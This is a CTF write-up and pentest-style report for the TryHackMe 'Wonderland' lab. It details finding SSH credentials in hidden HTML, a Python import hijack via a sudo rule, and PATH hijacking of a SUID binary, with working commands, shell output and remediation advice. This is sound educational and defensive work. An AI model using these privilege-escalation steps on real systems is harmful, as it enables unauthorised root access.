# Wonderland

**Platform:** TryHackMe
**OS:** Linux
**Tags:** Web Enum, Hidden Credentials, SUID, PATH Hijacking, Python Library Hijack
**Date:** 2026-05-04

SSH credentials hidden in page source give initial access. Python library hijacking moves between users and PATH hijacking via a SUID binary gives root.

## 1. Enumeration

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.6p1 Ubuntu
- 80/tcp - Golang net/http server, page title: "Follow the white rabbit."

## 2. Web Enumeration

The site hints to follow the white rabbit. Manually navigated the directory structure - the path was literally spelled out:

```
http://<TARGET_IP>/r/
http://<TARGET_IP>/r/a/
http://<TARGET_IP>/r/a/b/
http://<TARGET_IP>/r/a/b/b/
http://<TARGET_IP>/r/a/b/b/i/
http://<TARGET_IP>/r/a/b/b/i/t/
```

Viewed the page source at `/r/a/b/b/i/t/`. Found SSH credentials hidden in a hidden HTML element:

```html
<p style="display: none;">alice:<password></p>
```

Tip: Always view page source on themed CTF boxes - developers love hiding hints in HTML comments and hidden elements.

## 3. Initial Access: Alice

```bash
ssh alice@<TARGET_IP>
```

Landed in Alice's home directory. Found `walrus_and_the_carpenter.py` and `root.txt`. Root flag is in Alice's directory but unreadable. User flag is in `/root/`. Classic Wonderland twist.

**Initial access as alice established.**

## 4. Lateral Movement: rabbit User

Checked sudo permissions for alice:

```bash
sudo -l
```

Alice can run `walrus_and_the_carpenter.py` as rabbit with sudo. The script imports the `random` library. Created a fake `random.py` in the current directory to hijack the import.

```bash
# Create fake random.py in /home/alice/
echo 'import os; os.system("/bin/bash")' > random.py
sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py
```

**Shell as rabbit obtained.**

Found a SUID binary in rabbit's home: `teaParty`

```bash
ls -la /home/rabbit/teaParty
strings /home/rabbit/teaParty
```

Strings output revealed it calls `date` without a full path - vulnerable to PATH hijacking.

## 5. PrivEsc: PATH Hijacking

The `teaParty` binary is SUID root and calls `date` without an absolute path. Created a fake `date` binary and prepended the directory to PATH.

```bash
# Create malicious date binary
cd /tmp
echo '/bin/bash' > date
chmod +x date

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
/home/rabbit/teaParty
```

**Root shell obtained. Retrieved flags from /root/ and /home/alice/**

Key Takeaway: When a SUID binary calls a command without its full path, you can hijack it by creating a fake binary with the same name and putting its directory first in PATH. Always run `strings` on unknown binaries.

---

## Penetration Test Report

**Target:** wonderland.thm
**Address:** <TARGET_IP>
**Assessment type:** Web application & Linux host assessment
**Assessment date:** 4 May 2026
**Environment:** TryHackMe laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing identified one critical and two high severity findings affecting **wonderland.thm** . The host running a Golang web server embedded SSH credentials for the `alice` account in a hidden HTML paragraph at a discoverable URL path. These credentials provided initial SSH access.
From the alice account, a misconfigured sudo rule permitted execution of a Python script as the `rabbit` user. The script's Python import path was hijacked by placing a malicious module in the current directory, yielding a shell as rabbit. A SUID binary in rabbit's home directory called the `date` command without an absolute path, enabling PATH hijacking to obtain a root shell.

### Impact

The compromise chain crossed from an unauthenticated web visitor to a root shell in three steps. Each step exploited a distinct control failure: credential exposure, unsafe sudo delegation, and an SUID binary with an unqualified command reference. Root access permits modification of all accounts, files and services on the host.

### Priority recommendations

1. Remove credentials from HTML source immediately and rotate the affected SSH keys and passwords.
2. Restrict the alice sudo rule to prevent Python library hijacking, or remove it entirely.
3. Remove the SUID bit from the teaParty binary, or rewrite it to use absolute paths for all command invocations.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| wonderland.thm | <TARGET_IP> | Linux host; Golang HTTP server; OpenSSH |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Golang net/http server; Alice in Wonderland themed content |

```
nmap -sV -sC -T4 <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Golang net/http server
|_http-title: Follow the white rabbit.
```

The web server title "Follow the white rabbit." hinted at the directory enumeration path: /r/a/b/b/i/t/. Credentials were found by viewing the page source at the final path node.

### 2.2 Approach

Web enumeration followed the thematic hint and manually navigated the URL directory structure. Page source review at `/r/a/b/b/i/t/` revealed hidden credentials. SSH access with recovered credentials led to discovery of a misconfigured sudo rule and a SUID binary. Sudo was used for lateral movement; the SUID binary was exploited for privilege escalation.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | SSH credentials embedded in a hidden HTML element at a web-accessible URL | **Critical** | 6 |
| [F-02](#f-02) | Python library hijack via unrestricted sudo delegation | **High** | 7 |
| [F-03](#f-03) | PATH hijacking via SUID binary invoking date without an absolute path | **High** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Navigated URL path /r/a/b/b/i/t/ and viewed page source; found hidden SSH credentials. | alice SSH credentials |
| 02 | Authenticated via SSH as alice using recovered credentials. | alice user shell |
| 03 | Placed fake random.py in /home/alice; invoked sudo rule to run walrus_and_the_carpenter.py as rabbit. | rabbit shell |
| 04 | Identified SUID teaParty binary; created fake date binary in /tmp; prepended /tmp to PATH and ran teaParty. | Root shell |

### 3.3 Flag location note

The box inverts the typical flag layout: the root flag is in `/home/alice/` (readable only after root access), and the user flag is in `/root/` . This is an intentional design element and does not represent an additional finding.

## 4.1 SSH Credentials Embedded in HTML Source

### F-01   Credentials in hidden HTML paragraph - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The page at `/r/a/b/b/i/t/` contained a paragraph element styled with `display: none` that held plaintext SSH credentials for the user alice. Although the element was hidden from normal browser rendering, the credentials were present in the page source and accessible to any user who navigated to the URL. Authentication via SSH using these credentials succeeded immediately. |
| Prerequisites | HTTP access to the web server. No authentication required. |
| Impact | Any unauthenticated visitor obtaining the page source acquires valid SSH credentials. Initial authenticated access to the host as alice. |
| Affected system | wonderland.thm:80 `/r/a/b/b/i/t/` - page source |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. Browse to the web application and view the page source.
2. Navigate through directory paths hinted at in the page (e.g. `/r/a/b/b/i/t/` ).
3. Identify credentials embedded in a hidden paragraph element in the page source.
4. Use the credentials to authenticate over SSH: `ssh alice@<TARGET_IP>` .

### Evidence

```
# Page source at http://<TARGET_IP>/r/a/b/b/i/t/
<p style="display: none;">alice:[redacted]</p>

# SSH authentication using recovered credentials
ssh alice@<TARGET_IP>
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

Evidence E-01. Hidden paragraph in page source contained plaintext SSH credentials. Password redacted. SSH authentication succeeded immediately.

### Remediation

Remove all credential material from HTML source immediately and rotate the alice SSH password and any associated keys. Audit all web-accessible pages for similar embedded credentials. Implement a pre-commit check or web application scanning step to detect credential exposure before deployment.

## 4.2 Python Library Hijack via Sudo Delegation

### F-02   Import hijack via writable current directory - HIGH

| Field | Assessment |
| --- | --- |
| Description | Alice's sudo rule permitted running `/usr/bin/python3 /home/alice/walrus_and_the_carpenter.py` as the rabbit user. The script performed `import random` . Python resolves imports by searching the current directory first. By placing a file named `random.py` in `/home/alice/` containing a shell spawn, the import was hijacked and executed as rabbit when the sudo command was run. |
| Prerequisites | alice account access (F-01) and write access to /home/alice/. |
| Impact | Lateral movement to the rabbit user account. Access to files and permissions held by rabbit, including the teaParty SUID binary used in F-03. |
| Affected system | `/etc/sudoers` - alice sudo rule `/home/alice/walrus_and_the_carpenter.py` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-426](https://cwe.mitre.org/data/definitions/426.html) : Untrusted Search Path |

### Steps to reproduce

1. Check what Python scripts a privileged user can run: `sudo -l` .
2. Identify a script that imports a Python library (e.g. `import random` ).
3. Create a malicious version of that library in the current directory: `echo 'import os; os.system("/bin/bash")' > random.py` .
4. Run the script with sudo: `sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py` .
5. Observe that the malicious library is loaded and a shell executes as the privileged user.

### Evidence

```
alice@wonderland:~$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py

# Create malicious random.py in /home/alice/
alice@wonderland:~$ echo 'import os; os.system("/bin/bash")' > random.py

# Run script as rabbit - Python loads our random.py from cwd
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py

rabbit@wonderland:/home/alice$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

Evidence E-02. Python import search order exploited via writable current directory. Shell obtained as rabbit.

### Remediation

Remove the sudo rule for alice or restrict it to a specific, argument-fixed invocation that does not allow the working directory to influence module loading. Consider using absolute imports and a fixed `PYTHONPATH` that excludes user-writable directories. Alternatively, run the script from a directory that alice cannot write to.

## 4.3 PATH Hijacking via SUID Binary

### F-03   teaParty SUID binary calls date without absolute path - HIGH

| Field | Assessment |
| --- | --- |
| Description | The binary `/home/rabbit/teaParty` had the SUID bit set with root as the owner. Running `strings` on the binary revealed it invoked `date` without an absolute path. The PATH environment variable is resolved at execution time, so placing a malicious binary named `date` in a directory prepended to PATH caused teaParty to execute the attacker-controlled binary with root privileges. |
| Prerequisites | rabbit account access (F-02) and the ability to write to a directory that can be prepended to PATH. |
| Impact | Arbitrary command execution as root. Full host compromise. |
| Affected system | `/home/rabbit/teaParty` (SUID root binary) |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-426](https://cwe.mitre.org/data/definitions/426.html) : Untrusted Search Path |

### Steps to reproduce

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null` .
2. Identify a binary that calls a system command without a full path (e.g. calls `date` instead of `/bin/date` ) by running `strings` on the binary.
3. Create a malicious `date` script in `/tmp` : `echo '#!/bin/bash' > /tmp/date && echo 'bash -p' >> /tmp/date && chmod +x /tmp/date` .
4. Prepend `/tmp` to PATH: `export PATH=/tmp:$PATH` .
5. Run the SUID binary and observe a root shell.

### Evidence

```
rabbit@wonderland:/home/rabbit$ ls -la teaParty
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit$ strings teaParty | grep date
/bin/echo -n 'Probably by ' && date --date='next hour' -R

# date is called without an absolute path
# Create fake date binary in /tmp
rabbit@wonderland:/home/rabbit$ cd /tmp
rabbit@wonderland:/tmp$ echo '/bin/bash' > date
rabbit@wonderland:/tmp$ chmod +x date

# Prepend /tmp to PATH
rabbit@wonderland:/tmp$ export PATH=/tmp:$PATH

# Run the SUID binary
rabbit@wonderland:/tmp$ /home/rabbit/teaParty

root@wonderland:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@wonderland:/tmp# cat /home/alice/root.txt
[redacted]
```

Evidence E-03. PATH hijacking via SUID binary. Fake date binary placed in /tmp and directory prepended to PATH. Root shell obtained when teaParty executed. Flag redacted. Reference: GTFOBins PATH hijacking.

### Remediation

Remove the SUID bit from teaParty or rewrite the binary to use absolute paths for all command invocations, including `/bin/date` . Where a SUID binary must call external commands, set a safe, fixed PATH within the binary at startup. Audit all SUID binaries using `find / -perm -4000` and review each for unqualified command references using `strings` .

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Remove credentials from HTML source and rotate the alice account password. | F-01 |
| Immediate | Remove SUID bit from teaParty or replace with a version using absolute paths. | F-03 |
| High | Remove or restrict the alice sudo rule to prevent library hijacking. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/home/alice/random.py` | Python library hijack payload | Not verified |
| `/tmp/date` | PATH hijacking fake binary | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Wonderland assessment walkthrough](wonderland-thm.html) . SSH passwords and flag values are redacted from all evidence blocks.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2-3: Web enumeration and credential discovery in page source |
| E-02 | Walkthrough section 4: Sudo rule exploitation and Python library hijack |
| E-03 | Walkthrough section 5: SUID binary PATH hijacking and root shell |
